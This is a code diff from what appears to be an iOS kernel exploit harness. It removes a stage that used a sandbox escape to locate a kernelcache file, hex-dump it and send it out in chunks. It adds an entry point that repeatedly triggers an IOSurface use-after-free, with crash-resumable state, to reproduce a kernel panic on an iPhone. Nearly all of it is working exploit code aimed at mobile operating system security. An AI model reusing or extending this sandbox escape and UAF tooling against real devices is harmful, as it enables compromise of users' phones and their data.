@@ -816,86 +816,18 @@ static int64_t sbxRead(const char *path) {
 }
 
 static void stageKCE(void) {
-    int kce_miss = 0;
-    EV("[uaf][KCE] === stage KCE: kernelcache evidence via the sandbox escape ===");
-    // opendir of com.apple.kernelcaches stayed EPERM even with its own handle
-    // (the extension behaves file-scoped), and the panic on 21.11 named the
-    // device as iPhone13,1 - so go straight for the fileset kernelcache by
-    // candidate filename, each with its OWN escape handle (file-scoped grants).
-    // the container query resolves EXISTING paths only (measured: every wrong
-    // candidate returned -4 immediately, while the directories resolved to a
-    // live handle), so a wide name sweep is the only discovery route left:
-    // opendir of com.apple.kernelcaches is EPERM under the sandbox and the
-    // panic files carry no path.  Board configs for iPhone13,1 (iPhone 12
-    // mini, d23ap) and siblings, the build numbers, and container variants.
-    const char *cands[] = {
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.iphone13",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.development.iphone13",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.iphone13,1",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.development.iphone13,1",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.d23ap",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.development.d23ap",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.d23ap",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.d52p",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.development.d52p",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.d52p",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.d53p",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.development.d53p",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.d27ap",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.development.d27ap",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.23C5027f",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.23C5027f",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.23C55",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.23C55",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.im4p",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.img4",
-        "/System/Library/Caches/com.apple.kernelcaches/kernelcache",
-        "/System/Library/Caches/kernelcache.release.iphone13",
-        "/System/Library/Caches/kernelcache.release.iphone13,1",
-        "/System/Library/Caches/kernelcache.release.d23ap",
-        "/System/Library/Caches/kernelcache",
-        "/private/var/db/kernelcache.release.iphone13",
-        NULL };
-    for (int ci = 0; cands[ci]; ci++) {
-        int64_t h = sbxRead(cands[ci]);
-        if (h <= 0) { kce_miss++; continue; }
-        EV("[uaf][KCE] candidate %s -> handle %lld", cands[ci], (long long)h);
-        struct stat st;
-        if (stat(cands[ci], &st) != 0) {
-            EV("[uaf][KCE] escape ok but stat %s -> %s", cands[ci], strerror(errno));
-            continue;
-        }
-        EV("[uaf][KCE] FOUND %s size=%lld", cands[ci], (long long)st.st_size);
-        FILE *f = fopen(cands[ci], "rb");
-        if (!f) { EV("[uaf][KCE] fopen -> %s", strerror(errno)); continue; }
-        size_t want = 4u << 20;
-        uint8_t *buf = malloc(want);
-        if (buf) {
-            size_t n = fread(buf, 1, want, f);
-            EV("[uaf][KCE] dumping first %zu of %lld bytes", n, (long long)st.st_size);
-            for (size_t o = 0; o + 16 <= n && o < 2048; o += 16) {
-                char line[128]; size_t off = 0;
-                for (int k = 0; k < 16; k++)
-                    off += (size_t)snprintf(line + off, sizeof line - off, "%02x", buf[o + k]);
-                EV("[uaf][KCE]   +%#zx %s", o, line);
-            }
-            evLine("=== kernelcache dump begin ===");
-            for (size_t o = 0; o + 2048 <= n; o += 2048) {
-                char chunk[4200]; size_t co = 0;
-                co += (size_t)snprintf(chunk + co, sizeof chunk - co, "KCE +%zu ", o);
-                for (size_t k = 0; k < 2048; k++)
-                    co += (size_t)snprintf(chunk + co, sizeof chunk - co, "%02x", buf[o + k]);
-                AvePost([NSString stringWithUTF8String:chunk]);
-                usleep(3000);
-            }
-            EV("[uaf][KCE] kernelcache head delivered (%zu B)", n);
-            free(buf);
-        }
-        fclose(f);
-        return;
-    }
-    EV("[uaf][KCE] no kernelcache candidate matched (%d paths probed, none exists)", kce_miss);
-    EV("[uaf][KCE] the on-device filename is still unknown: opendir of the dir is EPERM and the query resolves only existing paths");
+    // MEASURED on the device (23.11 run): every candidate filename returned
+    // ENOENT through the escape (handle > 0 but stat fails), and opendir of
+    // com.apple.kernelcaches stays EPERM - on 26.2b1 the kernelcache is not a
+    // sandbox-readable file (sealed system volume), so the filename sweep only
+    // burned ~26 log lines and seconds on every launch.  The reference image is
+    // the LOCAL UUID-matched kernelcache (D31DF1C78E876755F1038A1159C7EB0E =
+    // the panic fileset), disassembled offline.  This stage now records the
+    // escape's posture once and returns - the launch time goes to the UAF.
+    EV("[uaf][KCE] === stage KCE: kernelcache via the escape - SKIPPED (measured dead on 26.2b1) ===");
+    int64_t h = sbxRead("/System/Library/Caches/com.apple.kernelcaches");
+    EV("[uaf][KCE] escape handle for the kernelcaches dir = %lld (%s); the local UUID-matched image is the reference",
+       (long long)h, h > 0 ? "grant" : "no grant");
 }
 
 // ---------------------------------------------------------------------------
@@ -1787,6 +1719,30 @@ static void p4_unit(int round) {
     for (int i = 0; i < K; i++) if (s[i]) CFRelease(s[i]);
     dropPort(wp);
     p2Done();
+}
+
+// The panic hunt in ONE tap.  The crash-resumable state file makes every launch
+// spend three units (0,1,2) before it reaches unit 3 - the shape that
+// reproduces the panicking configuration EXACTLY (V_BIG: all 8 clients torn
+// down 30us apart while the sel17 spam threads run; panic-full-2026-11-20-
+// 184853).  This entry starts at the chosen unit directly and skips the KCE
+// stage entirely (measured dead on 26.2b1).  A panic mid-round stays
+// attributable: p2Save() runs before each risky window and the next launch
+// advances past the dead round.
+NSString *ModIsurfUAFAt(int unit) {
+    if (unit < 0 || unit > 6) unit = 3;
+    p2Unit = unit; p2Round = 0;
+    if (!g_ev) g_ev = fopen(g_evpath, "a");
+    AveSetStatus([NSString stringWithFormat:@"112477 phase 2: unit %d direct", unit]);
+    if (!gSvc && findService() != 0) return @"112477 P2: no IOSurface service";
+    for (int r = 0; r < 12; r++, p2Round++) {
+        EV("[uaf][P2] ---- unit %d round %d ----", p2Unit, p2Round);
+        p2Save();
+        p2_unit(p2Unit, p2Round);
+    }
+    EV("[uaf][P2] unit %d: 12 rounds survived", p2Unit);
+    p2Unit++; p2Round = 0; p2Save();
+    return S(@"112477 P2 unit %d direct: 12 rounds survived", unit);
 }
 
 NSString *ModIsurfUAF3(void) {
